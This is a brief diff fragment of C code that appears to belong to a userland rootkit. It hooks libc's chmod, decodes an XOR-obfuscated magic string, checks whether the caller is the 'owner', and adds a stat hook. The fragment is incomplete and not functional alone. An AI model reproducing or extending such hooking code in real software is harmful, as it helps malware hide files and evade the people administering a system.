@@ -140,7 +140,8 @@ int chmod(const char *path, mode_t mode)
 	#endif
 	
 	char *magic = strdup(MAGIC); xor(magic);
-       	struct stat filestat; 	
+       	struct stat filestat; 
+	HOOK(stat);	
 	old_stat(path, &filestat);	
 	if (owned())
 	{
